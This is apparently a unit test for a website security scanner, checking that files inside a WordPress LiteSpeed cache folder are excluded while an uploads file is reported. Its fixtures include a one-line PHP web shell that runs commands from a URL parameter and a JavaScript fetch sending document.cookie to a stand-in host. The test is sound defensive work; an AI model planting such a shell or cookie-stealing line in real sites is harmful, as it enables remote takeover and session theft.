import tempfile
from pathlib import Path
import unittest
from unittest.mock import patch

import security_scan as s


class LiteSpeedCacheExclusionTests(unittest.TestCase):
    def test_scan_skips_entire_litespeed_cache_tree(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            cache = root / 'wp-content' / 'litespeed'
            js = cache / 'js' / 'generated.js'
            js.parent.mkdir(parents=True)
            js.write_text('fetch("https://example.test", {body: document.cookie});')
            php = cache / 'nested' / 'shell.php'
            php.parent.mkdir()
            php.write_text('<?php system($_GET["cmd"]); ?>')
            other = root / 'uploads' / 'shell.php'
            other.parent.mkdir()
            other.write_text('<?php system($_GET["cmd"]); ?>')

            with patch.object(s.os, 'geteuid', return_value=0, create=True), \
                    patch.object(s, 'suspicious_persistence', return_value=[]):
                report = s.scan(roots=[root], deep=True)

            self.assertEqual([finding['path'] for finding in report['findings']], [str(other)])
            self.assertEqual(report['files_inspected'], 1)


if __name__ == '__main__':
    unittest.main()
